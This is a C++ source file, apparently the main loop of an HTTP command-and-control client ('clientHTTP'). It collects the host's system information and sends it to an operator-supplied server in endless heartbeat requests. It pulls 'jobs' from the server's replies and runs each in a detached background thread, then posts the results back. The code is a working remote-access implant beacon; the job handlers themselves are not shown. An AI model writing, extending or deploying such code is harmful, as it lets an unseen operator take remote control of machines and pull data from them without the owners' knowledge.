// Copyright (c) Nouman Tajik [github.com/tajiknomi]
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE. 


#include <iostream>
#include <string>
#include "http.h"
#include "utilities.h"
#include "operations.h"
#include <thread>
#include <sharedResourceManager.h>
#include "systemInformation.h"
#include "json.h"
#include "stringUtil.h"

#define NUM_OF_ARGS 3


int main(int argc, char** argv) {

    if(argc != NUM_OF_ARGS){
        std::cout << "clientHTTP <URL/IP> <PORT>" <<std::endl;
        return -1;
    }

    const std::wstring url{ StringUtils::s2ws(argv[1]) };
    const std::wstring port{ StringUtils::s2ws(argv[2]) };

    if (!isValidPort(StringUtils::ws2s(port))) {
		return -1;
	}

    const std::wstring sysInfo {JsonUtil::to_json(SysInformation::getSysInfo())};
    SharedResourceManager sharedResources;
    sharedResources.setSysInfoInJson(sysInfo);
    const std::wstring heartbeatRequestToServer {createHeartbeatRequest(sysInfo)}; 
    std::wstring request; //{ heartbeatRequestToServer }; 
    std::wstring replyFromServerInJson;
    std::wstring response;       
    HttpPost httpPost;
    
    while(true){        
        if(sharedResources.isResponseAvailable()){      // If there is a response to be send to the server
            request = sharedResources.popResponse();
            replyFromServerInJson = httpPost(url, port, request);
            request.clear();
        }
        else {                                          // else, send alive signal to server
            replyFromServerInJson = httpPost(url, port, heartbeatRequestToServer);
        }
        if(isJobAvailable(replyFromServerInJson)){      // Check the response from the server to see if it is a job request
            sharedResources.pushJob(replyFromServerInJson);
            std::thread jobThread(startJob, std::ref(sharedResources));      // Spawn a thread if there is a job waiting in the queue
            jobThread.detach();
        }                          
    }
    return 0;
}